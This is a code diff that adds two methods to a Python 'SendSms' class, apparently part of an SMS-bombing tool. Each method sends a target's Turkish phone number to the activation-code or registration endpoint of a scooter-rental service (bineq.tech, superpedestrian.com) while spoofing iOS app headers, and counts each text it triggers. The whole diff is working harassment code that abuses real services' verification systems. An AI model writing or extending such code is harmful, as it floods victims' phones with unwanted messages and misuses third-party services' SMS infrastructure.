@@ -524,3 +524,34 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com")
+            
+    
+    #bineq.tech--sms
+    def Bineq(self):
+        try:
+            url = f"https://bineqapi.heymobility.tech:443/V1//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&areaCode=90"
+            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "SCOOBY/16 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
+            bineq = requests.post(url, headers=headers)
+            if bineq.json()["IsSuccess"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bineq.tech")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bineq.tech")
+            
+            
+    #superpedestrian.com
+    def Link(self):
+        try:
+            url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Device": "D6AD4AE2-E842-4C4D-A42C-662E69A9651E/Apple/Unknown", "Accept-Encoding": "gzip, deflate", "User-Agent": "iOS/15.6.1 LINK/5.2.4/6197", "Accept-Language": "tr-GB", "Connection": "close"}
+            json={"phone_number": f"+90{self.phone}"}
+            link = requests.post(url, headers=headers, json=json)
+            if link.json()["detail"] == "Ok":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> superpedestrian.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> superpedestrian.com")
